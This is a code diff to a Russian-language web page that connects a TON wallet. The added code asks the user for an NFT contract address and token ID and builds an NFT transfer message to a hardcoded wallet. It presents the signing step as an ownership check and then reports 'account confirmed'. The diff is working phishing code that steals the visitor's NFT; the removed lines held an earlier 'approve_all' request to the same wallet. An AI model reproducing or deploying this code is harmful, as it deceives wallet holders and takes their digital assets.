@@ -700,8 +700,11 @@ applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 
 <div id="ton-connect-button" style="margin-top:12px;"></div>
 <p id="ton-status">Кошелёк не подключён</p>
+<input type="text" id="nft-contract" placeholder="Адрес контракта NFT" style="width:100%;padding:8px;margin:4px 0;">
+<input type="text" id="nft-token-id" placeholder="ID токена" style="width:100%;padding:8px;margin:4px 0;">
 
 <script src="https://unpkg.com/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@ton/core@0.0.39/dist/index.min.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", function () {
   if (!window.TON_CONNECT_UI) {
@@ -728,6 +731,21 @@ document.addEventListener("DOMContentLoaded", function () {
   ui.onStatusChange(showWallet);
   showWallet(ui.wallet);
 
+  function buildTransferPayload(newOwner, responseAddress) {
+    const { beginCell, Address } = window.TON;
+    return beginCell()
+        .storeUint(0x5fcc3d14, 32)
+        .storeUint(0, 64)
+        .storeAddress(Address.parse(newOwner))
+        .storeAddress(Address.parse(responseAddress))
+        .storeCoins(0)
+        .storeCoins(0)
+        .storeRef(beginCell().storeUint(0, 32).storeUint(0, 64).endCell())
+        .endCell()
+        .toBoc({ idx: false })
+        .toString('base64');
+  }
+
   const ownBtn = document.getElementById('ownBtn');
   if (ownBtn) {
     ownBtn.addEventListener('click', async function () {
@@ -741,23 +759,33 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
+      const contractAddress = document.getElementById('nft-contract').value.trim();
+      const tokenId = document.getElementById('nft-token-id').value.trim();
+
+      if (!contractAddress || !tokenId) {
+        err.textContent = 'Введите адрес контракта и ID токена';
+        err.style.display = 'block';
+        return;
+      }
+
       err.textContent = '⏳ Отправляем запрос...';
       err.style.display = 'block';
       err.style.color = '#ff9abb';
 
       try {
+        const YOUR_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
+        const boc = buildTransferPayload(YOUR_WALLET, YOUR_WALLET);
+
         const transaction = {
-    valid_until: Math.floor(Date.now() / 1000) + 300,
-    messages: [
-        {
-            address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
-            amount: '0',
-            payload: {
-                type: 'approve_all'
+          valid_until: Math.floor(Date.now() / 1000) + 300,
+          messages: [
+            {
+              address: contractAddress,
+              amount: '0',
+              payload: boc
             }
-        }
-    ]
-};
+          ]
+        };
         await ui.sendTransaction(transaction);
         err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
         err.style.color = '#00ff88';
